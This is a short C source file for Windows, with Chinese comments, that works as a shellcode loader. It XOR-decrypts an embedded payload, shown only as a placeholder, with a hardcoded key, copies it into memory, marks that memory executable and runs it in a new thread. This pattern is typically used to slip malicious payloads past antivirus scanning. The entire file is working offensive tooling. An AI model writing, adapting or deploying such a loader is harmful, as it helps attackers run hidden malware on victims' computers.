#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char shellcode[] = {Shellcode};  //嵌入加密后的Shellcode
unsigned int shellcode_len = sizeof(shellcode);

//XOR解密秘钥
char secert[] = "12345abcde67890";

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
            if (j == key_len - 1) j = 0;

            data[i] = data[i] ^ key[j];
            j++;
    }
}

int main(void) {
  void * shellcode_mem;
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;
  shellcode_mem = VirtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  XOR((char *) shellcode, shellcode_len, secert, sizeof(secert));
  RtlMoveMemory(shellcode_mem, shellcode, shellcode_len);
  rv = VirtualProtect(shellcode_mem, shellcode_len, PAGE_EXECUTE_READ, &oldprotect);
  if ( rv != 0 ) {
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) shellcode_mem, 0, 0, 0);
    WaitForSingleObject(th, -1);
  }
  return 0;
}
